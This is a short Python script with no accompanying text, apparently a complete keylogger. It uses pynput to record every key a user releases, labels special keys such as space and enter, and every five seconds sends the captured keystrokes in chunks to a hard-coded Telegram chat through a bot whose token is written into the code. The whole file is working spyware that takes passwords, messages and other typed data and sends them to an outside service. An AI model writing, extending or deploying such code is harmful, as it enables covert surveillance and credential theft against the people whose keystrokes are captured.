from telebot import TeleBot
from time import sleep
from pynput import keyboard
from threading import Thread, RLock, Condition

BOT_TOKEN = "8965063782:AAES9_RiQdI9QEfrOCQBgAEUAsEkLi69k-s"
bot = TeleBot(BOT_TOKEN)

class Log:
    def __init__(self):
        self.log = ""
        self.lock = RLock()
        self.condition = Condition(self.lock)
        self.id = "6742765286"

    def add_to_log(self, log):
        with self.lock:
            self.log += log
            self.condition.notify_all()

    def send_log(self):
        with self.lock:
            while self.log == "":
                self.condition.wait()
            chunks = [self.log[i:i+1000] for i in range(0, len(self.log), 1000)]
            for chunk in chunks:
                try:
                    bot.send_message(self.id, chunk)
                except Exception:
                    pass
            self.log = ""


class Keylogger(Thread):
    def __init__(self, log):
        super().__init__(daemon=True)
        self.log = log

    def on_release(self, key):
        try:
            name = key.char
            if name is None:
                return
        except AttributeError:
            if key == keyboard.Key.space:
                name = "[SPACE]"
            elif key == keyboard.Key.enter:
                name = "[ENTER]\n"
            else:
                name = f"[{str(key).replace('Key.', '').upper()}]"
        self.log.add_to_log(name)

    def run(self):
        with keyboard.Listener(on_release=self.on_release) as listener:
            listener.join()


class Sender(Thread):
    def __init__(self, log):
        super().__init__(daemon=True)
        self.log = log

    def run(self):
        while True:
            sleep(5)
            self.log.send_log()


log = Log()

keylogger = Keylogger(log)
keylogger.start()

sender = Sender(log)
sender.start()

keylogger.join()
